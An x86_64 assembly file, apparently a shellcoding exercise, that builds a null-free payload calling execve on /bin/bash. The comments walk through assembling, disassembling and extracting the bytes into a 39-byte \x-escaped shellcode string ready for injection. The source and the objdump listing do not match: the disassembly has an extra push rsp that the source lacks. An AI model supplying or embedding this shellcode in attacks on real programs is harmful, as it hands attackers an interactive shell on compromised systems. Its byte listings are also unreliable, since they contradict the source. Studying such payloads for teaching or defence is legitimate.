; execve("////////bin/bash")
; author Chase Hatch
; 2019 redux
; x86_64 parameters order: rdi, rsi, rdx, r10, r8, and r9


section .text
global _start
_start:
        xor rax, rax
        push rax
        pop rdx
        mov rbx, qword 0x687361622f6e6962       ;  hsab/nib 
        push rbx
        mov rbx, qword 0x2f2f2f2f2f2f2f2f       ;  ////////
        push rbx
        push rsp
        pop rdi
        push rax
        push rdi
        push rsp
        pop rsi
        mov al, 59      ;execve
        syscall




; fgrep exec /usr/include/asm/unistd_64.h
; #define __NR_execve 59
; cho "ibase=10;obase=16;59" |bc
; 3B


; forget ASCII output, this is /bin/bash in Little Endian byte order

; echo -n "////////bin/bash" |xxd -e -g 8 -c 8
; 00000000: 2f2f2f2f2f2f2f2f  ////////
; 00000008: 687361622f6e6962  bin/bash

; nasm -f elf64  execve_64bit_binbash.asm -o execve_64bit_binbash.o
; ld  execve_64bit_binbash.o -o execve_64bit_binbash.elf

;objdump -d ./execve_64bit_binbash.elf
;./execve_64bit_binbash.elf:     file format elf64-x86-64
;Disassembly of section .text:
;
;0000000000401000 <_start>:
;  401000:       48 31 c0                xor    %rax,%rax
;  401003:       50                      push   %rax
;  401004:       54                      push   %rsp
;  401005:       5a                      pop    %rdx
;  401006:       48 bb 62 69 6e 2f 62    movabs $0x687361622f6e6962,%rbx
;  40100d:       61 73 68 
;  401010:       53                      push   %rbx
;  401011:       48 bb 2f 2f 2f 2f 2f    movabs $0x2f2f2f2f2f2f2f2f,%rbx
;  401018:       2f 2f 2f 
;  40101b:       53                      push   %rbx
;  40101c:       54                      push   %rsp
;  40101d:       5f                      pop    %rdi
;  40101e:       50                      push   %rax
;  40101f:       57                      push   %rdi
;  401020:       54                      push   %rsp
;  401021:       5e                      pop    %rsi
;  401022:       b0 3b                   mov    $0x3b,%al
;  401024:       0f 05                   syscall
;


;echo """ 48 31 c0            
; 50                  
; 54                  
; 5a                  
; 48 bb 62 69 6e 2f 62
; 61 73 68 
; 53                  
; 48 bb 2f 2f 2f 2f 2f
; 2f 2f 2f 
; 53                  
; 54                  
; 5f                  
; 50                  
; 57                  
; 54                  
; 5e                  
; b0 3b               
; 0f 05""" | tr -d $'\n' |sed -re 's/[ ]+/\ /g' -e 's/ /\\x/g'
;\x48\x31\xc0\x50\x54\x5a\x48\xbb\x62\x69\x6e\x2f\x62\x61\x73\x68\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x53\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05
;
;

; echo -e """\x48\x31\xc0\x50\x54\x5a\x48\xbb\x62\x69\x6e\x2f\x62\x61\x73\x68\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x53\x54\x5f\x50\x57\x54\x5e\xb0\x3b\x0f\x05""" |wc -c
; 39



